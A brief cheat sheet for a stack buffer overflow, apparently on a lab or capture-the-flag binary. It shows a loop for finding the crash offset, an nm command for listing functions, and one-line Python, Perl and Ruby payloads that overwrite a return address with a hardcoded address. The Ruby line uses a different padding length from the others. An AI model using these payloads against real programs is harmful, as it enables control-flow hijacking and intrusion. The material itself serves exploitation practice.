
## Getting Offset

```
for j in {20..45}; do echo -n "$j: "; ./a.out `ruby -e "print 'A'*$j"`; done
```

## Check Method Names

```

nm binary | grep " t "


```


## One-Liner Payload

```
./a.out `python -c 'print "A"*30 + "BBBB" + "\x5e\x84\x04\x08"'`
./a.out `perl -e 'print "A"x30 . "BBBB" . "\x5e\x84\x04\x08"'`
./a.out `ruby -e 'print "A"*50 + "BBBB" + "\x5e\x84\x04\x08"'`
```